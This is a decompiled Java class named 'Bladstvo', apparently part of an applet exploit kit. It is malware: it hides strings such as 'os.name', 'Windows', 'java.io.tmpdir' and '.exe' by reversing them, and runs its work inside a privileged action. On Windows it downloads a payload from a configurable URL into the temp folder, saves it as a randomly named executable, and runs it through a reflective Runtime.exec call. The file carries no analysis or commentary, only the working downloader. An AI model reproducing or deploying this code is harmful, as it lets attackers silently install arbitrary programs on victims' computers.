// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.security.AccessController;
import java.io.FileOutputStream;
import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Bladstvo implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    static {
        Bladstvo.data = null;
        Bladstvo.cc = null;
    }
    
    public static byte[] StringToBytes(final String s) {
        final byte byte0 = 2;
        final byte byte2 = 16;
        final byte[] abyte0 = new byte[s.length() / byte0];
        for (int i = 0; i < s.length(); i += byte0) {
            abyte0[i / byte0] = (byte)((Character.digit(s.charAt(i), byte2) << 4) + Character.digit(s.charAt(i + 1), byte2));
        }
        return abyte0;
    }
    
    public Object run() throws Exception {
        if (Bladstvo.data == null) {
            return null;
        }
        try {
            final int b = 124;
        }
        catch (Exception e) {
            System.out.println(e);
            e.printStackTrace();
            return null;
        }
        try {
            final String s = "gn4";
            final String s2 = "eman.so";
            final String s3 = "on4";
            final String s4 = new StringBuffer(s2).reverse().toString();
            final String s5 = "op2";
            final String s6 = "swo".concat("dn").concat("iW");
            final String s7 = "op3";
            final String s8 = new StringBuffer(s6).reverse().toString();
            final String s9 = "mke";
            final String s10 = "ri".concat("dpm").concat("t.o").concat("i.av").concat("aj");
            final String s11 = "fgo";
            final String s12 = new StringBuffer(s10).reverse().toString();
            final String s13 = "mk2";
            final String s14 = "exe.";
            final String s15 = "bfo";
            final String s16 = new StringBuffer(s14).reverse().toString();
            final String s17 = "loe";
            final String s18 = System.getProperty(s4);
            if (s18.indexOf(s8) >= 0) {
                int i = 1;
                if (Bladstvo.cc != null) {
                    i = Integer.parseInt(Bladstvo.cc);
                }
                final char c = '\u0400';
                for (int j = 0; j < i; ++j) {
                    final String s19 = Bladstvo.data + "1";
                    final String s20 = "9ie";
                    final URL url = new URL(s19);
                    final InputStream inputstream = (InputStream)function(url, "openStream");
                    String s21 = System.getProperty(s12);
                    s21 += File.separator;
                    s21 += Math.random();
                    s21 += s16;
                    final FileOutputStream fileoutputstream = new FileOutputStream(s21);
                    int k = 0;
                    int l;
                    while ((l = inputstream.read()) != -1) {
                        fileoutputstream.write(l);
                        ++k;
                    }
                    inputstream.close();
                    fileoutputstream.close();
                    if (k >= c) {
                        function(Runtime.getRuntime(), "exec", new Object[] { s21 });
                    }
                }
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        return null;
    }
    
    public Bladstvo() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }
    
    public static Object function(final Object obj, final String name) {
        final Class cls = obj.getClass();
        try {
            final Method method = cls.getMethod(name, (Class[])null);
            return method.invoke(obj, (Object[])null);
        }
        catch (NoSuchMethodException ex) {
            ex.printStackTrace();
        }
        catch (IllegalAccessException ex2) {
            ex2.printStackTrace();
        }
        catch (InvocationTargetException ex3) {
            throw new RuntimeException(ex3);
        }
        return null;
    }
    
    public static Object function(final Object obj, final String name, final Object[] val) {
        if (val.length == 0) {
            function(obj, name);
        }
        final Class cls = obj.getClass();
        try {
            Method[] methods;
            int i;
            for (methods = cls.getMethods(), i = 0; i < methods.length; ++i) {
                if (methods[i].getName().equals(name) && checkMethod(methods[i], val)) {
                    return methods[i].invoke(obj, val);
                }
            }
            System.out.println("FUNCTION NOT FOUND!!!: " + methods[i].getName());
        }
        catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
    
    public static boolean check(final Class[] cls, final Object[] val) {
        if (cls.length != val.length) {
            return false;
        }
        for (int i = 0; i < cls.length; ++i) {
            if (!val[i].getClass().getName().toUpperCase().contains(cls[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
    
    private static boolean checkMethod(final Method m, final Object[] val) {
        final Class[] cls = m.getParameterTypes();
        return check(cls, val);
    }
    
    public static Object con(final String ClassName, final Object[] obj, final Class[] list) {
        try {
            final Class cls = Class.forName(ClassName);
            return cls.getConstructor((Class<?>[])list).newInstance(obj);
        }
        catch (ClassNotFoundException ex3) {
            System.out.println("ClassNotFoundException");
            return null;
        }
        catch (InstantiationException ex4) {
            System.out.println("InstantiationException");
        }
        catch (NoSuchMethodException ex) {
            ex.printStackTrace();
            System.out.println("NoSuchMethodException");
        }
        catch (IllegalAccessException ex5) {
            System.out.println("IllegalAccessException");
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
}
